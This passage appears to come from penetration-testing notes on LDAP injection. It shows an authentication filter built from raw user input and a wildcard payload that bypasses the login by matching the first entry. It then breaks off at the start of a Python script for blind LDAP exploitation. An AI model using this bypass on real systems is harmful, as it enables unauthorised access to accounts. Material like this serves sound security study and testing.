...
- if authentication is based on a ldap query, like

```php
(&(uid={userInput})(userPassword={passwordInput}))
```

- it can be bypassed with the * operator, it fetches the first entry

```php
(&(uid=*)(userPassword=*))
```

## automatically exploiting blind ldap
```python
import requests
